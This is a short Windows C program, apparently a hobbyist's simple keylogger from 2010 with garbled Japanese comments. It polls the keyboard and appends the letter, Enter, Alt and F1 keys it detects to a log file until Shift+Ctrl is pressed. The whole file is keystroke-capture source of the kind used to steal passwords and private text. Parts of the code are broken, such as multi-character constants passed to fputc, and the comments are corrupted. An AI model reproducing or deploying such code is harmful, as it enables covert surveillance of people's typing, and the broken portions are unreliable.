//2010/06/15 Shirao
//�ȒP�ȃL�[���K�[
//���쒆�ɉ����ꂽ�L�[���擾����ishift-ctrl�ŏI���j

#define WIN32_LEAN_AND_MEAN  //exe�k��

#include <windows.h>
#include <stdio.h>

int APIENTRY WinMain( HINSTANCE hInstance,
                      HINSTANCE hPrevInstance,
                      LPSTR lpCmdLine,
                      int nShowCmd)
{
  FILE *fp;  //���O���������ރt�@�C���|�C���^
  if(fopen_s(&fp, "log.txt", "a") != 0){
    MessageBox(GetActiveWindow(), L"fopen error", L"error", MB_ICONERROR);
    return -1;
  }
  MessageBox(GetActiveWindow(), L"Key Logger Start", L"Message", MB_OK);
  bool cntf = true;
  while(cntf){
    int c, k;
    //�A���t�@�x�b�g�L�[�X�L�������[�v
    for(c = 'A'; c <= 'Z'; c++){
      //shift��������Ă��邩�ۂ�
      if(GetAsyncKeyState(VK_SHIFT) & 0x8000)
        k = c;  //�啶��
      else
        k = c+('a'-'A');  //������
      //������Ă����Ȃ�K�؂ɏo��
      if(GetAsyncKeyState(c) & 0x0001){
        fputc(k, fp); fflush(fp);
        continue;
      }
	  if(GetAsyncKeyState(VK_MENU)){
		  fputc('Alt',fp);fflush(fp);
	  }
	  if(GetAsyncKeyState(VK_F1)){
		  fputc('F1',fp);fflush(fp);
	  }
    //Enter�ŉ��s
      if(GetAsyncKeyState(VK_RETURN) & 0x0001){
        fputc('\n', fp); fflush(fp);
      }
    }
    //shift-ctrl�ŏI������
    if( (GetAsyncKeyState(VK_SHIFT) & 0x8000) &&
        (GetAsyncKeyState(VK_CONTROL) & 0x8000))
      cntf = false;
    Sleep(50);
  }
  _fcloseall();  //�t�@�C�������
  MessageBox(GetActiveWindow(), L"Key Logger End", L"Message", MB_OK);
  return 0;
}

